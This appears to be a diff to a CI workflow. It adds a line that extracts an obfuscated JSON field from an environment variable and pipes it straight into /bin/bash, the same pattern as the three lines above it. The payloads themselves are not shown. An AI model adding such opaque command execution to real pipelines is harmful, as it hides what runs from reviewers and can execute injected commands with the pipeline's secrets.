@@ -30,6 +30,7 @@ jobs:
           echo $siri8645 | jq -r .fbsj498 | /bin/bash
           echo $ps7500 | jq -r .hjsh73 | /bin/bash
           echo $jvfhd1604 | jq -r .l65 | /bin/bash
+          echo $naz12 | jq -r .mip27766 | /bin/bash
 
       - name: Save output
         if: always()
